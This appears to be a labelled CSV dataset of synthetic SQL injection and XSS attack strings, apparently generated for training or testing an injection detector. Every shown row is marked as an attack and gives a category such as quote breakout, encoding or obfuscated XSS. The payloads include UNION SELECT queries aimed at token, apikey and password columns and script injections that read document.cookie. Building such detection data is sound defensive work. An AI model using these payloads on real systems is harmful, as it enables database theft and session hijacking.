text,label,attack_type,category,generator
4 AnD (select count(*) from auth)>0%00,1,sqli,nl_framed,claude
can you show the field <details onbeforetoggle=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
"""><svg onpageshow=alert(document.cookie)>",1,xss,xss_obf,claude
0 Or 2=8/**/,1,sqli,bare_logic,claude
1 oR exists(select balance from tokens)-- ,1,sqli,nl_framed,claude
"<img%09src=x
onerror=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
7 OR email LiKE '%'%00,1,sqli,quote_breakout,claude
<svg/onstart=alert(document.domain)>,1,xss,xss_obf,claude
<SvG oNERrOR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
can you show the field <input oncontentvisibilityautostatechange=print()> when it errors,1,xss,xss_obf,claude
give profiles where pwd is anything or condition always holds,1,sqli,nl_framed,claude
1 AnD (select count(*) from accounts)>1/*c*/,1,sqli,nl_framed,claude
1 oR exists(select dob from orders)-- -,1,sqli,nl_framed,claude
7 aND (select count(*) from clients)>0,1,sqli,nl_framed,claude
<style%09onload=top['al'+'ert'](1)>,1,xss,xss_obf,claude
0x93 OR 0x28=0x71,1,sqli,encoding,claude
<table oncontentvisibilityautostatechange=alert(document.cookie)>,1,xss,xss_obf,claude
list the dob of all profiles regardless of id,1,sqli,nl_framed,claude
char(52) oR char(57)=char(51),1,sqli,encoding,claude
can you show the field <embed onanimationstart=alert(document.domain)> when it errors,1,xss,xss_obf,claude
<svg/onpointerrawupdate=alert(document.domain)>,1,xss,xss_obf,claude
1' or 'x'='x-- -,1,sqli,quote_breakout,claude
get accounts where ssn is anything or condition always holds,1,sqli,nl_framed,claude
please render <keygen onstart=alert(1)> here for the user,1,xss,xss_obf,claude
<svg/onpointerrawupdate=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
7 UNiOn seLECT uid From people;,1,sqli,nl_framed,claude
<svg/onload=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
"2	UnIoN/**/selEcT token,apikey,balance FROm cards/*c*/",1,sqli,nl_framed,claude
pull every members where 2 = 2 or true,1,sqli,nl_framed,claude
or exists(select email from auth);,1,sqli,nl_framed,claude
get users where uid is anything or condition always holds,1,sqli,nl_framed,claude
oR exists(select role from orders)%00,1,sqli,nl_framed,claude
"6 UNION SeLEct pwd,secret frOm orders%00",1,sqli,nl_framed,claude
});alert`1`;//,1,xss,xss_obf,claude
'-alert(document.cookie)-',1,xss,xss_obf,claude
<a href=&#106;avascript:print()>x</a>,1,xss,xss_obf,claude
0x48 OR 0x51=0x82,1,sqli,encoding,claude
give the secret of all clients regardless of id,1,sqli,nl_framed,claude
1 Or ssn lIKE '%'-- -,1,sqli,quote_breakout,claude
please render <svg ontoggle=confirm(1)> here for the user,1,xss,xss_obf,claude
char(52) OR char(52)=char(57),1,sqli,encoding,claude
char(50) Or char(51)=char(51),1,sqli,encoding,claude
admin' Or 'y'='a-- x,1,sqli,quote_breakout,claude
4 Or 1=1-- ,1,sqli,bare_logic,claude
"""><keygen onstart=top['al'+'ert'](1)>",1,xss,xss_obf,claude
0x18 OR 0x96=0x38,1,sqli,encoding,claude
9 or 6=1-- x,1,sqli,bare_logic,claude
char(54) OR char(51)=char(48),1,sqli,encoding,claude
can you show the field <table onstart=alert(1)> when it errors,1,xss,xss_obf,claude
admin' oR 'x'='x-- x,1,sqli,quote_breakout,claude
fetch each sessions where 3 is 9 or true,1,sqli,nl_framed,claude
please render <marquee onload=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
give clients where ssn is anything or condition always holds,1,sqli,nl_framed,claude
